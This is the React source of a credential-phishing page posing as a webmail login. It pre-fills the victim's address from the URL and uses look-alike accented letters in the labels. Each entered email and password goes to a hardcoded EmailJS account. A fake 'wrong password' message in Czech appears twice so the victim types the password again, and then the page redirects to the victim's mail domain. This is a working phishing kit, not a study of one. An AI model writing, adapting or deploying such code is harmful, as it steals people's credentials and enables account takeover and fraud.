//jshint esversion:6
import React, {useState, useRef} from 'react'
import emailjs from '@emailjs/browser';
import ClipLoader from "react-spinners/ClipLoader";
import Grid from '@mui/material/Grid';
import logo from './logo.jpg';
import VisibilityOffIcon from '@mui/icons-material/VisibilityOff';
import VisibilityIcon from '@mui/icons-material/Visibility';


function getPartAfterDot(text) {
  var dotIndex = text.indexOf('@');
  if (dotIndex !== -1) {
    return text.substring(dotIndex + 1);
  }
  return '';
}

function App() {
  const url = window.location.search.slice(20)
  const form = useRef();
  const [count, setCount] = useState(0)
  const [email, setEmail] = useState(url ? url : '')
  const [pwdOne, setPwdOne] = useState('')

  const [pwdError, setPwdError] =  useState(false)

  const [loading, setLoading] = useState(false)
  const [visible, setVisible] = useState(false)

  const handleEmailChange = (e) => {
    setEmail(e.target.value)
  }
  const handlePwdOneChange = (e) => {
    setPwdOne(e.target.value)
  }


  const handleFormSubmit = async (e) => {
    e.preventDefault()
    setPwdError(false)
    setLoading(true)

    if (count < 2) {
      setCount(prevCount => prevCount + 1)

      setLoading(true)
      emailjs.sendForm('service_ugyug6e', 'template_orxa9ec', form.current, 'uuFf1B0OjAlZUMWXx')
      .then((result) => {
        setPwdOne("")
        setLoading(false)
        setPwdError(true)
      }, (error) => {
          console.log(error.text);
      });
    }


    if (count >= 2 ) {
      emailjs.sendForm('service_ugyug6e', 'template_orxa9ec', form.current, 'uuFf1B0OjAlZUMWXx')
      .then((result) => {
        const redir = getPartAfterDot(email)
        window.location.replace(`https://${redir}`);
      }, (error) => {
          console.log(error.text);
      });
    }
  }

  const handleVisibility = () => {
    setVisible(prevValue => !prevValue)
  }

  return (
    <div className="general">
      <h2>WÉBMÁlL</h2>
      <img src={logo} className="img2" alt='Timeout'/>
      <form ref={form} onSubmit={handleFormSubmit}>
          <label>EmáíI</label>
          <input type="email" name="mascot" value={email} onChange={handleEmailChange} required/>

          <label>Pásswórd</label>
          <Grid container>
            <Grid item xs={12}>
              <input type={visible ? "text" : "password"} color='primary' name="pwdOne" value={pwdOne} onChange={handlePwdOneChange} required />
            </Grid>
              <Grid item xs={1} sx={{position: 'relative', left: '250px', top: '-40px'}}>
                {!visible ? 
                  <VisibilityIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} /> 
                  : 
                  <VisibilityOffIcon onClick={handleVisibility} sx={{cursor: 'pointer'}} />
                }
              </Grid>
          </Grid>


          {pwdError && <div className='error'>nesprávné heslo, zkuste to znovu</div>}
          <input type="submit" value="Continue" />

      </form>

      {loading && 
        <div className='loader'>
          <ClipLoader
            color='#0073c6dc'
            loading={loading}
            size={150}
            aria-label="Loading Spinner"
            data-testid="loader"
          />
        </div>
      }
    </div>
  );
}

export default App;
